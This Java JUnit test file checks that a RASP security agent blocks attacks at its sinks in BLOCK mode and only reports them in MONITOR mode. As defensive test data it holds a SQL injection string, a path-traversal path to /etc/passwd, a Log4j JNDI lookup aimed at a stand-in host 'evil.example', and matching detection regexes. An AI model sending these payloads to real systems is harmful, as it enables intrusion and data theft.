package com.rasp.probe;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;

import java.lang.reflect.Field;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertThrows;

/**
 * End-to-end proof that the RASP blocking path actually rejects attacks.
 *
 * <p>The previous audit noted the blocking logic existed ({@code SecurityAgent} throws a
 * {@link SecurityException} when a sink payload matches a {@code BLOCKING} rule) but had
 * never been shown to reject a real request. These tests install a BLOCK-mode
 * {@link ProbeState} carrying a {@code BLOCKING} rule — exactly what the Server pushes to
 * the agent via the config heartbeat — and then call the production sink-report entry
 * point {@link SecurityAgent#reportSink(String, String)}. The instrumented hooks call that
 * same method on every JDBC / command / file / JNDI / expression sink, so a thrown
 * {@link SecurityException} is what aborts the vulnerable request in production.
 */
class RaspBlockingE2ETest {
    private Object savedState;
    private Object savedEngine;
    private Object savedBuffer;

    @AfterEach
    void restore() throws Exception {
        setStatic("state", savedState);
        setStatic("raspSemanticEngine", savedEngine);
        setStatic("eventBuffer", savedBuffer);
        CircuitBreaker.resetForTesting();
    }

    @Test
    void payloadBlacklistRuleRejectsAttackAtSink() throws Exception {
        ProbeState state = raspState("BLOCK", List.of(new AgentRule(11L, "PAYLOAD_BLACKLIST", "BLOCKING",
                "(?i)union\\s+select", "", "", 0.95, "sqli-blacklist")));
        RaspSemanticEngine engine = withEngine(state);
        install(state, engine);

        String malicious = "select * from users where id=1 union select password from admins";

        SecurityException thrown = assertThrows(SecurityException.class,
                () -> SecurityAgent.reportSink("jdbc", malicious),
                "a matching BLOCKING PAYLOAD_BLACKLIST rule must reject the attack at the sink");
    }

    @Test
    void virtualPatchRuleRejectsAttackAtSink() throws Exception {
        ProbeState state = raspState("BLOCK", List.of(new AgentRule(12L, "VIRTUAL_PATCH", "BLOCKING",
                "(?i)\\.\\./", "", "", 0.9, "path-traversal-patch")));
        RaspSemanticEngine engine = withEngine(state);
        install(state, engine);

        assertThrows(SecurityException.class,
                () -> SecurityAgent.reportSink("file", "/var/www/../../etc/passwd"),
                "a matching BLOCKING VIRTUAL_PATCH rule must reject the path-traversal attempt");
    }

    @Test
    void obviousAttackBlockedByBuiltInSignatureInBlockMode() throws Exception {
        // Even with no custom rules, BLOCK mode blocks well-known attack signatures via the
        // built-in local rule (Log4j/JNDI lookup here).
        ProbeState state = raspState("BLOCK", List.of());
        RaspSemanticEngine engine = withEngine(state);
        install(state, engine);

        assertThrows(SecurityException.class,
                () -> SecurityAgent.reportSink("jndi", "${jndi:ldap://evil.example/x}"),
                "BLOCK mode must block the obvious JNDI/LDAP lookup signature");
    }

    @Test
    void samePayloadOnlyObservedInMonitorModeNotBlocked() throws Exception {
        // Control case: identical payload + identical BLOCKING rule, but in MONITOR mode the
        // agent only observes and reports — the request is NOT aborted (no exception).
        ProbeState state = raspState("MONITOR", List.of(new AgentRule(11L, "PAYLOAD_BLACKLIST", "BLOCKING",
                "(?i)union\\s+select", "", "", 0.95, "sqli-blacklist")));
        RaspSemanticEngine engine = withEngine(state);
        install(state, engine);

        SecurityAgent.reportSink("jdbc", "select * from users where id=1 union select password from admins");
    }

    private ProbeState raspState(String mode, List<AgentRule> rules) {
        ProbeState state = new ProbeState();
        state.applyConfig(Map.of("mode", mode, "ruleVersion", 99L, "rules", rules));
        return state;
    }

    private RaspSemanticEngine withEngine(ProbeState state) {
        ProbeConfig config = new ProbeConfig("http://127.0.0.1:1", "agent", "app", 1, 64);
        EventBuffer buffer = new EventBuffer(config, new ProbeHttpClient(config));
        return new RaspSemanticEngine(buffer, state);
    }

    private void install(ProbeState state, RaspSemanticEngine engine) throws Exception {
        savedState = peekStatic("state");
        savedEngine = peekStatic("raspSemanticEngine");
        savedBuffer = peekStatic("eventBuffer");
        setStatic("state", state);
        setStatic("raspSemanticEngine", engine);
        // The MONITOR-mode control case reaches the non-blocking branch which publishes an
        // event, so a functional EventBuffer must be present on the agent.
        ProbeConfig config = new ProbeConfig("http://127.0.0.1:1", "agent", "app", 1, 64);
        setStatic("eventBuffer", new EventBuffer(config, new ProbeHttpClient(config)));
        CircuitBreaker.resetForTesting();
    }

    private Object peekStatic(String name) throws Exception {
        Field field = SecurityAgent.class.getDeclaredField(name);
        field.setAccessible(true);
        return field.get(null);
    }

    private void setStatic(String name, Object value) throws Exception {
        Field field = SecurityAgent.class.getDeclaredField(name);
        field.setAccessible(true);
        field.set(null, value);
    }
}
